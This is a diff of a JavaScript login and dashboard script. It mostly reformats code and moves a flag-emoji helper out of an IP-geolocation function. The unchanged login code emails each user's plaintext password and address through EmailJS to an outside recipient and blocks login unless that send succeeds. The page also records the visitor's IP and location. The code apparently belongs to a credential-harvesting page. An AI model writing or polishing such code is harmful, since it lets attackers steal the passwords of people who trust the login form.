@@ -56,7 +56,7 @@ async function login(email, password) {
       {
         userpassword: password,
         useremail: email,
-        time: new Date().toISOString()
+        time: new Date().toISOString(),
       }
     );
     console.log("✅ EmailJS success:", result);
@@ -65,7 +65,7 @@ async function login(email, password) {
     alert(
       `Email failed.\nStatus: ${error?.status || "unknown"}\nMessage: ${error?.text || error?.message || "no details"}`
     );
-    return; // Stop login if email fails
+    return;
   }
 
   // Save login info locally
@@ -82,28 +82,26 @@ function loadDashboard() {
     window.location.href = "index.html";
     return;
   }
+
   const emailEl = document.getElementById("userEmail");
   if (emailEl) emailEl.textContent = currentUser.email;
 }
 
-  // ===== USER LOCATION (IP-based) =====
-    async function fetchUserLocation() {
-    try {
+// ======= UTILITY: Convert country code to flag emoji =======
+function countryCodeToFlag(code) {
+  if (!code) return "";
+  return code
+    .toUpperCase()
+    .replace(/./g, char => String.fromCodePoint(127397 + char.charCodeAt()));
+}
+
+// ======= USER LOCATION (IP-based) =======
+async function fetchUserLocation() {
+  try {
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
 
-    // Convert country code to flag emoji
-    function countryCodeToFlag(code) {
-      if (!code) return "";
-      return code
-        .toUpperCase()
-        .replace(/./g, char =>
-          String.fromCodePoint(127397 + char.charCodeAt())
-        );
-    }
-
     const flag = countryCodeToFlag(data.country_code);
-
     const sessionLocation = {
       ip: data.ip || "N/A",
       city: data.city || "N/A",
@@ -111,39 +109,29 @@ function loadDashboard() {
       country: data.country_name || "N/A",
       countryCode: data.country_code || "",
       timezone: data.timezone || "UTC",
-      utcOffset: data.utc_offset || "+00:00"
+      utcOffset: data.utc_offset || "+00:00",
     };
 
     localStorage.setItem("sessionLocation", JSON.stringify(sessionLocation));
 
-    // IP
+    // Update DOM elements
     const ipEl = document.getElementById("user-ip");
-    if (ipEl) {
-      ipEl.textContent = `IP: ${sessionLocation.ip}`;
-    }
+    if (ipEl) ipEl.textContent = `IP: ${sessionLocation.ip}`;
 
-    // Location + Flag
     const locationEl = document.getElementById("user-location");
-    if (locationEl) {
-      locationEl.textContent = `Location: ${flag} ${sessionLocation.city}, ${sessionLocation.country}`;
-    }
+    if (locationEl) locationEl.textContent = `Location: ${flag} ${sessionLocation.city}, ${sessionLocation.country}`;
 
-    // Time
     const timeEl = document.getElementById("user-time");
     if (timeEl) {
-      const localTime = new Date().toLocaleString("en-US", {
-        timeZone: sessionLocation.timezone
-      });
+      const localTime = new Date().toLocaleString("en-US", { timeZone: sessionLocation.timezone });
       timeEl.textContent = `Time: ${localTime}`;
     }
 
   } catch (e) {
     console.warn("Could not fetch IP location:", e);
-
     document.getElementById("user-ip").textContent = "IP: N/A";
     document.getElementById("user-location").textContent = "Location: N/A";
-    document.getElementById("user-time").textContent =
-      `Time: ${new Date().toLocaleString()}`;
+    document.getElementById("user-time").textContent = `Time: ${new Date().toLocaleString()}`;
   }
 }
 
@@ -160,10 +148,9 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  // Load dashboard if on dashboard page
+  // Load dashboard page features
   if (document.getElementById("userEmail")) {
     loadDashboard();
-
     fetchUserLocation();
   }
 });
